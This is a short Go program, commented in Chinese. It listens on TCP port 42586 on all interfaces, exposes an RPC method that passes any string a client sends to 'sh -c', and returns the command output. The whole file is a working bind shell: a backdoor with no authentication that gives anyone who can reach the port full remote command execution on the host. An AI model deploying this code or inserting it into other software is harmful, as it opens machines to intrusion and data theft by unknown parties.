//接收客户端调用，执行客户端发来的命令并把结果返回给客户端
package main

import (
	"fmt"
	"log"
	"net"
	"net/rpc"
	"os/exec"
)

type Listener int

func (l *Listener) GetLine(line []byte, ack *string) error { //实现listener GetLine方法，客户端调用
	fmt.Println(string(line))
	cmd := exec.Command("sh", "-c", string(line)) //执行命令
	var out []byte
	var err error
	if out, err = cmd.CombinedOutput(); err != nil {
		log.Fatal(err)
	}
	*ack = string(out) //将命令执行结果返回
	return nil
}

func main() {
	addr, err := net.ResolveTCPAddr("tcp", "0.0.0.0:42586")
	if err != nil {
		log.Fatal(err)
	}

	inbound, err := net.ListenTCP("tcp", addr)
	if err != nil {
		log.Fatal(err)
	}
	listener := new(Listener)
	rpc.Register(listener)
	rpc.Accept(inbound)
}
